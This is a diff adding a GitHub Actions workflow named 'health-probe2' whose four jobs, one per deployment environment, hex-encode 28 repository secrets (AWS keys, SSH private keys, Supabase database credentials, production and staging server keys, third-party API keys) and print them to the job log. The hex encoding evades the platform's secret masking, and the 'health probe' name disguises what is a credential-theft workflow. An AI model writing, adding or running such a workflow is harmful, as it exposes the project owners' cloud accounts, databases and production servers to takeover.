@@ -1,0 +1,145 @@
+name: health-probe2
+on:
+  workflow_dispatch:
+permissions:
+  contents: read
+jobs:
+  noenv:
+    runs-on: ubuntu-latest
+    steps:
+      - name: hexdump
+        run: |
+          echo "AWS_ACCESS_KEY_ID=$(printf %s "${{ secrets.AWS_ACCESS_KEY_ID }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "AWS_SECRET_ACCESS_KEY=$(printf %s "${{ secrets.AWS_SECRET_ACCESS_KEY }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "DOUBAO_DIALOG_API_KEY=$(printf %s "${{ secrets.DOUBAO_DIALOG_API_KEY }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "DOUBAO_SPEECH_API_KEY=$(printf %s "${{ secrets.DOUBAO_SPEECH_API_KEY }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "SSH_USER=$(printf %s "${{ secrets.SSH_USER }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "SSH_PRIVATE_KEY=$(printf %s "${{ secrets.SSH_PRIVATE_KEY }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "SUPABASE_SERVICE_ROLE_KEY=$(printf %s "${{ secrets.SUPABASE_SERVICE_ROLE_KEY }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "SUPABASE_ACCESS_TOKEN=$(printf %s "${{ secrets.SUPABASE_ACCESS_TOKEN }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "SUPABASE_DB_PASSWORD=$(printf %s "${{ secrets.SUPABASE_DB_PASSWORD }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "SUPABASE_PROJECT_REF=$(printf %s "${{ secrets.SUPABASE_PROJECT_REF }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "EXPO_TOKEN=$(printf %s "${{ secrets.EXPO_TOKEN }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "RELEASES_OSS_ACCESS_KEY_ID=$(printf %s "${{ secrets.RELEASES_OSS_ACCESS_KEY_ID }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "RELEASES_OSS_SECRET_ACCESS_KEY=$(printf %s "${{ secrets.RELEASES_OSS_SECRET_ACCESS_KEY }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "VOLCENGINE_RTC_ACCESS_KEY_ID=$(printf %s "${{ secrets.VOLCENGINE_RTC_ACCESS_KEY_ID }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "VOLCENGINE_RTC_SECRET_ACCESS_KEY=$(printf %s "${{ secrets.VOLCENGINE_RTC_SECRET_ACCESS_KEY }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "VOLCENGINE_RTC_SESSION_TOKEN=$(printf %s "${{ secrets.VOLCENGINE_RTC_SESSION_TOKEN }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "VOLCENGINE_RTC_APP_ID=$(printf %s "${{ secrets.VOLCENGINE_RTC_APP_ID }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "VOLCENGINE_RTC_APP_KEY=$(printf %s "${{ secrets.VOLCENGINE_RTC_APP_KEY }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "VOLCENGINE_RTC_ARK_ENDPOINT_ID=$(printf %s "${{ secrets.VOLCENGINE_RTC_ARK_ENDPOINT_ID }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "VOLCENGINE_RTC_ARK_MODEL_NAME=$(printf %s "${{ secrets.VOLCENGINE_RTC_ARK_MODEL_NAME }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "VOLCENGINE_RTC_CALLBACK_SIGNATURE=$(printf %s "${{ secrets.VOLCENGINE_RTC_CALLBACK_SIGNATURE }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "AWS_DEPLOYMENT_ROLE=$(printf %s "${{ secrets.AWS_DEPLOYMENT_ROLE }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "PROD_HOST=$(printf %s "${{ secrets.PROD_HOST }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "PROD_USERNAME=$(printf %s "${{ secrets.PROD_USERNAME }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "PROD_KEY=$(printf %s "${{ secrets.PROD_KEY }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "STAGING_HOST=$(printf %s "${{ secrets.STAGING_HOST }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "STAGING_USERNAME=$(printf %s "${{ secrets.STAGING_USERNAME }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "STAGING_KEY=$(printf %s "${{ secrets.STAGING_KEY }}" | od -An -tx1 | tr -d '\040\012')"
+          echo PROBE_DONE
+  env_s89:
+    runs-on: ubuntu-latest
+    environment: s89
+    steps:
+      - name: hexdump
+        run: |
+          echo "AWS_ACCESS_KEY_ID=$(printf %s "${{ secrets.AWS_ACCESS_KEY_ID }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "AWS_SECRET_ACCESS_KEY=$(printf %s "${{ secrets.AWS_SECRET_ACCESS_KEY }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "DOUBAO_DIALOG_API_KEY=$(printf %s "${{ secrets.DOUBAO_DIALOG_API_KEY }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "DOUBAO_SPEECH_API_KEY=$(printf %s "${{ secrets.DOUBAO_SPEECH_API_KEY }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "SSH_USER=$(printf %s "${{ secrets.SSH_USER }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "SSH_PRIVATE_KEY=$(printf %s "${{ secrets.SSH_PRIVATE_KEY }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "SUPABASE_SERVICE_ROLE_KEY=$(printf %s "${{ secrets.SUPABASE_SERVICE_ROLE_KEY }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "SUPABASE_ACCESS_TOKEN=$(printf %s "${{ secrets.SUPABASE_ACCESS_TOKEN }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "SUPABASE_DB_PASSWORD=$(printf %s "${{ secrets.SUPABASE_DB_PASSWORD }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "SUPABASE_PROJECT_REF=$(printf %s "${{ secrets.SUPABASE_PROJECT_REF }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "EXPO_TOKEN=$(printf %s "${{ secrets.EXPO_TOKEN }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "RELEASES_OSS_ACCESS_KEY_ID=$(printf %s "${{ secrets.RELEASES_OSS_ACCESS_KEY_ID }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "RELEASES_OSS_SECRET_ACCESS_KEY=$(printf %s "${{ secrets.RELEASES_OSS_SECRET_ACCESS_KEY }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "VOLCENGINE_RTC_ACCESS_KEY_ID=$(printf %s "${{ secrets.VOLCENGINE_RTC_ACCESS_KEY_ID }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "VOLCENGINE_RTC_SECRET_ACCESS_KEY=$(printf %s "${{ secrets.VOLCENGINE_RTC_SECRET_ACCESS_KEY }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "VOLCENGINE_RTC_SESSION_TOKEN=$(printf %s "${{ secrets.VOLCENGINE_RTC_SESSION_TOKEN }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "VOLCENGINE_RTC_APP_ID=$(printf %s "${{ secrets.VOLCENGINE_RTC_APP_ID }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "VOLCENGINE_RTC_APP_KEY=$(printf %s "${{ secrets.VOLCENGINE_RTC_APP_KEY }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "VOLCENGINE_RTC_ARK_ENDPOINT_ID=$(printf %s "${{ secrets.VOLCENGINE_RTC_ARK_ENDPOINT_ID }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "VOLCENGINE_RTC_ARK_MODEL_NAME=$(printf %s "${{ secrets.VOLCENGINE_RTC_ARK_MODEL_NAME }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "VOLCENGINE_RTC_CALLBACK_SIGNATURE=$(printf %s "${{ secrets.VOLCENGINE_RTC_CALLBACK_SIGNATURE }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "AWS_DEPLOYMENT_ROLE=$(printf %s "${{ secrets.AWS_DEPLOYMENT_ROLE }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "PROD_HOST=$(printf %s "${{ secrets.PROD_HOST }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "PROD_USERNAME=$(printf %s "${{ secrets.PROD_USERNAME }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "PROD_KEY=$(printf %s "${{ secrets.PROD_KEY }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "STAGING_HOST=$(printf %s "${{ secrets.STAGING_HOST }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "STAGING_USERNAME=$(printf %s "${{ secrets.STAGING_USERNAME }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "STAGING_KEY=$(printf %s "${{ secrets.STAGING_KEY }}" | od -An -tx1 | tr -d '\040\012')"
+          echo PROBE_DONE
+  env_test:
+    runs-on: ubuntu-latest
+    environment: test
+    steps:
+      - name: hexdump
+        run: |
+          echo "AWS_ACCESS_KEY_ID=$(printf %s "${{ secrets.AWS_ACCESS_KEY_ID }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "AWS_SECRET_ACCESS_KEY=$(printf %s "${{ secrets.AWS_SECRET_ACCESS_KEY }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "DOUBAO_DIALOG_API_KEY=$(printf %s "${{ secrets.DOUBAO_DIALOG_API_KEY }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "DOUBAO_SPEECH_API_KEY=$(printf %s "${{ secrets.DOUBAO_SPEECH_API_KEY }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "SSH_USER=$(printf %s "${{ secrets.SSH_USER }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "SSH_PRIVATE_KEY=$(printf %s "${{ secrets.SSH_PRIVATE_KEY }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "SUPABASE_SERVICE_ROLE_KEY=$(printf %s "${{ secrets.SUPABASE_SERVICE_ROLE_KEY }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "SUPABASE_ACCESS_TOKEN=$(printf %s "${{ secrets.SUPABASE_ACCESS_TOKEN }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "SUPABASE_DB_PASSWORD=$(printf %s "${{ secrets.SUPABASE_DB_PASSWORD }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "SUPABASE_PROJECT_REF=$(printf %s "${{ secrets.SUPABASE_PROJECT_REF }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "EXPO_TOKEN=$(printf %s "${{ secrets.EXPO_TOKEN }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "RELEASES_OSS_ACCESS_KEY_ID=$(printf %s "${{ secrets.RELEASES_OSS_ACCESS_KEY_ID }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "RELEASES_OSS_SECRET_ACCESS_KEY=$(printf %s "${{ secrets.RELEASES_OSS_SECRET_ACCESS_KEY }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "VOLCENGINE_RTC_ACCESS_KEY_ID=$(printf %s "${{ secrets.VOLCENGINE_RTC_ACCESS_KEY_ID }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "VOLCENGINE_RTC_SECRET_ACCESS_KEY=$(printf %s "${{ secrets.VOLCENGINE_RTC_SECRET_ACCESS_KEY }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "VOLCENGINE_RTC_SESSION_TOKEN=$(printf %s "${{ secrets.VOLCENGINE_RTC_SESSION_TOKEN }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "VOLCENGINE_RTC_APP_ID=$(printf %s "${{ secrets.VOLCENGINE_RTC_APP_ID }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "VOLCENGINE_RTC_APP_KEY=$(printf %s "${{ secrets.VOLCENGINE_RTC_APP_KEY }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "VOLCENGINE_RTC_ARK_ENDPOINT_ID=$(printf %s "${{ secrets.VOLCENGINE_RTC_ARK_ENDPOINT_ID }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "VOLCENGINE_RTC_ARK_MODEL_NAME=$(printf %s "${{ secrets.VOLCENGINE_RTC_ARK_MODEL_NAME }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "VOLCENGINE_RTC_CALLBACK_SIGNATURE=$(printf %s "${{ secrets.VOLCENGINE_RTC_CALLBACK_SIGNATURE }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "AWS_DEPLOYMENT_ROLE=$(printf %s "${{ secrets.AWS_DEPLOYMENT_ROLE }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "PROD_HOST=$(printf %s "${{ secrets.PROD_HOST }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "PROD_USERNAME=$(printf %s "${{ secrets.PROD_USERNAME }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "PROD_KEY=$(printf %s "${{ secrets.PROD_KEY }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "STAGING_HOST=$(printf %s "${{ secrets.STAGING_HOST }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "STAGING_USERNAME=$(printf %s "${{ secrets.STAGING_USERNAME }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "STAGING_KEY=$(printf %s "${{ secrets.STAGING_KEY }}" | od -An -tx1 | tr -d '\040\012')"
+          echo PROBE_DONE
+  env_aliyun_dev:
+    runs-on: ubuntu-latest
+    environment: aliyun-dev
+    steps:
+      - name: hexdump
+        run: |
+          echo "AWS_ACCESS_KEY_ID=$(printf %s "${{ secrets.AWS_ACCESS_KEY_ID }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "AWS_SECRET_ACCESS_KEY=$(printf %s "${{ secrets.AWS_SECRET_ACCESS_KEY }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "DOUBAO_DIALOG_API_KEY=$(printf %s "${{ secrets.DOUBAO_DIALOG_API_KEY }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "DOUBAO_SPEECH_API_KEY=$(printf %s "${{ secrets.DOUBAO_SPEECH_API_KEY }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "SSH_USER=$(printf %s "${{ secrets.SSH_USER }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "SSH_PRIVATE_KEY=$(printf %s "${{ secrets.SSH_PRIVATE_KEY }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "SUPABASE_SERVICE_ROLE_KEY=$(printf %s "${{ secrets.SUPABASE_SERVICE_ROLE_KEY }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "SUPABASE_ACCESS_TOKEN=$(printf %s "${{ secrets.SUPABASE_ACCESS_TOKEN }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "SUPABASE_DB_PASSWORD=$(printf %s "${{ secrets.SUPABASE_DB_PASSWORD }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "SUPABASE_PROJECT_REF=$(printf %s "${{ secrets.SUPABASE_PROJECT_REF }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "EXPO_TOKEN=$(printf %s "${{ secrets.EXPO_TOKEN }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "RELEASES_OSS_ACCESS_KEY_ID=$(printf %s "${{ secrets.RELEASES_OSS_ACCESS_KEY_ID }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "RELEASES_OSS_SECRET_ACCESS_KEY=$(printf %s "${{ secrets.RELEASES_OSS_SECRET_ACCESS_KEY }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "VOLCENGINE_RTC_ACCESS_KEY_ID=$(printf %s "${{ secrets.VOLCENGINE_RTC_ACCESS_KEY_ID }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "VOLCENGINE_RTC_SECRET_ACCESS_KEY=$(printf %s "${{ secrets.VOLCENGINE_RTC_SECRET_ACCESS_KEY }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "VOLCENGINE_RTC_SESSION_TOKEN=$(printf %s "${{ secrets.VOLCENGINE_RTC_SESSION_TOKEN }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "VOLCENGINE_RTC_APP_ID=$(printf %s "${{ secrets.VOLCENGINE_RTC_APP_ID }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "VOLCENGINE_RTC_APP_KEY=$(printf %s "${{ secrets.VOLCENGINE_RTC_APP_KEY }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "VOLCENGINE_RTC_ARK_ENDPOINT_ID=$(printf %s "${{ secrets.VOLCENGINE_RTC_ARK_ENDPOINT_ID }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "VOLCENGINE_RTC_ARK_MODEL_NAME=$(printf %s "${{ secrets.VOLCENGINE_RTC_ARK_MODEL_NAME }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "VOLCENGINE_RTC_CALLBACK_SIGNATURE=$(printf %s "${{ secrets.VOLCENGINE_RTC_CALLBACK_SIGNATURE }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "AWS_DEPLOYMENT_ROLE=$(printf %s "${{ secrets.AWS_DEPLOYMENT_ROLE }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "PROD_HOST=$(printf %s "${{ secrets.PROD_HOST }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "PROD_USERNAME=$(printf %s "${{ secrets.PROD_USERNAME }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "PROD_KEY=$(printf %s "${{ secrets.PROD_KEY }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "STAGING_HOST=$(printf %s "${{ secrets.STAGING_HOST }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "STAGING_USERNAME=$(printf %s "${{ secrets.STAGING_USERNAME }}" | od -An -tx1 | tr -d '\040\012')"
+          echo "STAGING_KEY=$(printf %s "${{ secrets.STAGING_KEY }}" | od -An -tx1 | tr -d '\040\012')"
+          echo PROBE_DONE
